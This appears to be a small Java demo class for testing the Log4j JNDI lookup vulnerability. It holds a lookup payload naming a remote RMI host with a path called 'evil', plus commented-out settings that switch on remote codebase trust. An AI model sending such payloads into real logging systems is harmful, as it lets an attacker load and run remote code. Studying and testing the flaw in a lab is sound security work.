package com.example.demo.java.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    private final static Logger log = LogManager.getLogger();

    public static void main(String[] args) {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String username = "${jndi:rmi://192.168.1.102:1099/evil}";
        log.info("{}","${java:os}");
    }
}
